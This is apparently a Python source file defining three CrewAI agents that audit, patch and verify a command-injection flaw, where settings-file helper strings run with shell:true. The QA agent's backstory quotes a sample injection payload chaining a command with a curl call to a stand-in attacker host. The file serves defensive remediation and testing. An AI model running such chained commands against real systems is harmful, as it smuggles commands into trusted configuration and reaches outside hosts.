"""
EX04 — CrewAI agent definitions for the VULN-03 remediation pipeline.

Agents are imported by vuln03_crew.py to keep each module under the
150-line budget enforced by Rule R7.
"""

from crewai import Agent

security_auditor = Agent(
    role="Security_Auditor",
    goal=(
        "Identify the exact source location and CWE-78 root cause of VULN-03, "
        "document the supply-chain attack scenario, and map the blast radius "
        "across graph communities reachable from bootstrap/state.ts."
    ),
    backstory=(
        "Expert in CI/CD supply-chain vulnerabilities and CWE-78 (OS Command "
        "Injection). Specialises in finding cases where untrusted "
        ".claude/settings.json helper strings are executed via shell:true."
    ),
    llm="anthropic/claude-haiku-4-5-20251001",
    memory=False,
    allow_delegation=False,
    verbose=True,
)

implementation_engineer = Agent(
    role="Implementation_Engineer",
    goal=(
        "Produce the complete secure remediation: a PreToolUse hook that "
        "sanitizes helperCommand, and the refactored spawn call using "
        "shell:false with an argv array."
    ),
    backstory=(
        "Senior security engineer who specialises in refactoring vulnerable "
        "Node.js child_process executions from shell:true string invocations "
        "to shell:false argv-array spawns, and writing strict PreToolUse "
        "Agent Hooks to sanitize input before any command runs."
    ),
    llm="anthropic/claude-haiku-4-5-20251001",
    memory=False,
    allow_delegation=False,
    verbose=True,
)

qa_verifier = Agent(
    role="QA_Verifier",
    goal=(
        "Replay known VULN-03 payloads against the patch, confirm every "
        "injection attempt is blocked, and issue the final sign-off report."
    ),
    backstory=(
        "Adversarial validation expert who simulates CI/CD attackers. "
        "Ensures that malicious payloads like "
        "'echo fake_key && curl http://attacker.com' are successfully blocked "
        "by the newly implemented PreToolUse hook and spawn refactoring."
    ),
    llm="anthropic/claude-haiku-4-5-20251001",
    memory=False,
    allow_delegation=False,
    verbose=True,
)
